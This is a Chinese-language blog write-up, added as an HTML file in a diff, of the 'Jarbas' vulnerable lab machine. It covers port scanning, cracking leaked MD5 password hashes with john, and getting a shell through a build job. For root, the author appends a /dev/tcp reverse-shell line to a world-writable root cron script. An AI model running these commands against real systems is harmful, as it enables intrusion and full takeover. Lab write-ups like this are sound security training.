@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="vulhub:Jarbas  端口扫描  12345678910111213kali@kali [~&#x2F;web_shell_toos] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.41.138                       [0:41:13]Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulhub:Jarbas">
+<meta property="og:url" content="http://example.com/2025/02/20/vulhub-Jarbas/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="vulhub:Jarbas  端口扫描  12345678910111213kali@kali [~&#x2F;web_shell_toos] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.41.138                       [0:41:13]Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/02/20/vulhub-Jarbas/1.png">
+<meta property="og:image" content="http://example.com/2025/02/20/vulhub-Jarbas/2.png">
+<meta property="og:image" content="http://example.com/2025/02/20/vulhub-Jarbas/3.png">
+<meta property="og:image" content="http://example.com/2025/02/20/vulhub-Jarbas/4.png">
+<meta property="article:published_time" content="2025-02-19T16:39:19.000Z">
+<meta property="article:modified_time" content="2025-02-19T17:17:09.347Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="Vulhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/02/20/vulhub-Jarbas/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>vulhub:Jarbas</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">Vulhub</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2025/02/17/vulhub-Prime1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/02/20/vulhub-Jarbas/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/02/20/vulhub-Jarbas/&text=vulhub:Jarbas"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/02/20/vulhub-Jarbas/&title=vulhub:Jarbas"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/02/20/vulhub-Jarbas/&is_video=false&description=vulhub:Jarbas"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=vulhub:Jarbas&body=Check out this article: http://example.com/2025/02/20/vulhub-Jarbas/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/02/20/vulhub-Jarbas/&title=vulhub:Jarbas"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/02/20/vulhub-Jarbas/&title=vulhub:Jarbas"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/02/20/vulhub-Jarbas/&title=vulhub:Jarbas"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/02/20/vulhub-Jarbas/&title=vulhub:Jarbas"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/02/20/vulhub-Jarbas/&name=vulhub:Jarbas&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/02/20/vulhub-Jarbas/&t=vulhub:Jarbas"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">vulhub:Jarbas</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">80端口渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        vulhub:Jarbas
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-02-19T16:39:19.000Z" itemprop="datePublished">2025-02-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Vulhub/" rel="tag">Vulhub</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">vulhub:Jarbas</h1>
+
+<h3>端口扫描</h3>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~/web_shell_toos] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.41.138                       [0:41:13]</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 00:41 CST</span><br><span class="line">Nmap scan report for 192.168.41.138</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">MAC Address: 00:0C:29:A5:68:07 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.10 seconds</span><br></pre></td></tr></table></figure>
+
+<p><strong>深度扫描</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  sudo nmap -sT -sV -sC -p22,80,3306,8080 -O 192.168.41.138                                [23:41:39]</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 23:42 CST</span><br><span class="line">Nmap scan report for 192.168.41.138</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)</span><br><span class="line">|   256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)</span><br><span class="line">|_  256 57:72:08:54:b7:56:ff:c3:e6:16:6f:97:cf:ae:7f:76 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)</span><br><span class="line">|_http-title: Jarbas - O Seu Mordomo Virtual!</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">3306/tcp open  mysql   MariaDB (unauthorized)</span><br><span class="line">8080/tcp open  http    Jetty 9.4.z-SNAPSHOT</span><br><span class="line">|_http-server-header: Jetty(9.4.z-SNAPSHOT)</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html;charset=utf-8).</span><br><span class="line">MAC Address: 00:0C:29:A5:68:07 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.58 seconds</span><br></pre></td></tr></table></figure>
+
+<h3>80端口渗透</h3>
+
+<p><img src="/2025/02/20/vulhub-Jarbas/1.png" alt="1"></p>
+<p><strong>看了一下，没发现啥东西，先进行目录爆破吧</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  sudo dirsearch -u http://192.168.41.138                                               [0:40:29]</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/http_192.168.41.138/_25-02-20_00-45-10.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.41.138/</span><br><span class="line"></span><br><span class="line">[00:45:19] 200 -  359B  - /access.html</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+
+<p><strong>访问&#x2F;access.html，拿到了几个账号和密码</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  curl http://192.168.41.138/access.html                                                [0:46:14]</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;New Agile version!&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;</span><br><span class="line">&lt;p align=center&gt; Creds encrypted in a safe way!&lt;/h2&gt;&lt;/p&gt;</span><br><span class="line">&lt;p align=center&gt; &lt;img src=&quot;geoffrey.jpg&quot; alt=&quot;Geoffrey&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;p align=center&gt; tiago:5978a63b4654c73c60fa24f836386d87&lt;br&gt;</span><br><span class="line">trindade:f463f63616cb3f1e81ce46b39f882fd5&lt;br&gt;</span><br><span class="line">eder:9b38e2b1e8b12f426b0d208a7ab6cb98&lt;br&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/p&gt; </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>看起来就是md5加密，放在john里面破解吧</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">                                 [0:51:45]</span><br><span class="line">kali@kali [~] ➜  john --format=Raw-MD5 x</span><br><span class="line"></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 3 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])</span><br><span class="line">Warning: no OpenMP support for this hash type, consider --fork=4</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Warning: Only 9 candidates buffered for the current salt, minimum 24 needed for performance.</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">Proceeding with incremental:ASCII</span><br><span class="line">marianna         (trindade)     </span><br><span class="line">vipsu            (eder)     </span><br><span class="line">italia99         (tiago)     </span><br><span class="line">3g 0:00:02:21 DONE 3/3 (2025-02-20 00:54) 0.02114g/s 35986Kp/s 35986Kc/s 37262KC/s italia03..italien7</span><br><span class="line">Use the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure>
+
+<p><strong>密码破解之后，因为开放ssh和3306端口，所以我就直接进行爆破，但是hydra破解未果，只能寻找是否有其它登录入口，最终发现8080的登录入口</strong></p>
+<p><img src="/2025/02/20/vulhub-Jarbas/2.png" alt="2"></p>
+<p><strong>登录之后，我们构建一个项目，发现可以进行命令执行，我们直接进行反弹shell</strong></p>
+<p><strong><img src="/2025/02/20/vulhub-Jarbas/3.png" alt="3"></strong></p>
+<p><strong>启动监听，然后点击立即构建，这样命令便执行了，拿到shell</strong></p>
+<h3>提权</h3>
+
+<p><img src="/2025/02/20/vulhub-Jarbas/4.png" alt="4"></p>
+<p><strong>我们拿到的这个shell，权限很低的，很多命令无法执行，像ip addr，wget去下载文件也不行，只能手动枚举找一些突破口</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the local System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    #1) Respect the privacy of others.</span><br><span class="line">    #2) Think before you type.</span><br><span class="line">    #3) With great power comes great responsibility.</span><br><span class="line">bash-4.2$ cat /etc/cortab    </span><br><span class="line">cat /etc/cortab</span><br><span class="line">cat: /etc/cortab: No such file or directory</span><br><span class="line">bash-4.2$ cat /etc/crontab</span><br><span class="line">cat /etc/crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">For details see man 4 crontabs</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Example of job definition:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.---------------- minute (0 - 59)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">|  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">|  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">|  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">|  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">|  |  |  |  |</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">*  *  *  *  * user-name  <span class="built_in">command</span> to be executed</span></span><br><span class="line">*/5 * * * * root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">bash-4.2$ </span><br></pre></td></tr></table></figure>
+
+<p><strong>我们发现了一个bash脚本，详细查看一下</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ cat /etc/script/CleaningScript.sh</span><br><span class="line">cat /etc/script/CleaningScript.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">rm -rf /var/log/httpd/access_log.txt</span><br><span class="line">bash-4.2$ ls -la /etc/script </span><br><span class="line">ls -la /etc/script</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x.  2 root root   31 Apr  1  2018 .</span><br><span class="line">drwxr-xr-x. 83 root root 8192 Feb 19 13:15 ..</span><br><span class="line">-rwxrwxrwx.  1 root root   50 Apr  1  2018 CleaningScript.sh</span><br></pre></td></tr></table></figure>
+
+<p><strong>这个脚本不重要，重要的是我们有可以写入的权限，而且这个计划任务是以root身份执行的，那我们直接写入反弹shell即可</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.41.133/4444 0&gt;&amp;1&quot; &gt;&gt; /etc/script/CleaningScript.sh</span><br><span class="line">&lt;i &gt;&amp; /dev/tcp/192.168.41.133/4444 0&gt;&amp;1&quot; &gt;&gt; /etc/script/CleaningScript.sh    </span><br><span class="line">bash-4.2$ cat /etc/script/CleaningScript.sh</span><br><span class="line">cat /etc/script/CleaningScript.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">rm -rf /var/log/httpd/access_log.txt</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.41.133/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  nc -lvnp 4444                                                                                                                    [1:04:21]</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.41.133] from (UNKNOWN) [192.168.41.138] 47144</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">[root@jarbas ~]# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">Vulhub</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">vulhub:Jarbas</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">80端口渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/02/20/vulhub-Jarbas/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/02/20/vulhub-Jarbas/&text=vulhub:Jarbas"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/02/20/vulhub-Jarbas/&title=vulhub:Jarbas"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/02/20/vulhub-Jarbas/&is_video=false&description=vulhub:Jarbas"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=vulhub:Jarbas&body=Check out this article: http://example.com/2025/02/20/vulhub-Jarbas/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/02/20/vulhub-Jarbas/&title=vulhub:Jarbas"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/02/20/vulhub-Jarbas/&title=vulhub:Jarbas"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/02/20/vulhub-Jarbas/&title=vulhub:Jarbas"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/02/20/vulhub-Jarbas/&title=vulhub:Jarbas"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/02/20/vulhub-Jarbas/&name=vulhub:Jarbas&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/02/20/vulhub-Jarbas/&t=vulhub:Jarbas"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">Vulhub</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
